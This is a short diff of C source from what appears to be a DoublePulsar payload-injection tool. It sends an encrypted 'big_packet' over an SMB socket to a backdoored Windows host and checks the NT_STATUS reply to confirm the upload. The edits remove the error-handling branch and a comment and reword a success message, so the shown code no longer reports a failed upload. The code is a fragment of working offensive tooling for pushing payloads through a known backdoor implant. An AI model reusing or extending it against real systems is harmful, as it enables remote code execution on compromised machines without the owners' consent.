@@ -337,17 +337,10 @@ int main(int argc, char* argv[])
 			//send(s, &buf, 4178, 0);
 			send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
 			recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-			
-			//compare the NT_STATUS response to 0xC0000002 ( STATUS_NOT_IMPLEMENTED )
 			if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 			{
-				printf("Finished sending all data!  And got good response from DoublePulsar!\n");
+				printf("All data sent and got good response from DoublePulsar!\n");
 			}
-			else {
-				printf("Not good!  Doesn't seem to be working!  DoublePulsar error! Exiting!\n");
-				goto cleanup;
-			}
-			
 			break;
 		}
 		memcpy(big_packet, trans2_request, sizeof(trans2_request));
@@ -413,7 +406,7 @@ cleanup:
 	//free the memory for the XOR buffer
 	free(encrypted);
 
-	//free the 4096 packet
+	//free the 4178 packet
 	free(big_packet);
 
 	closesocket(sock);
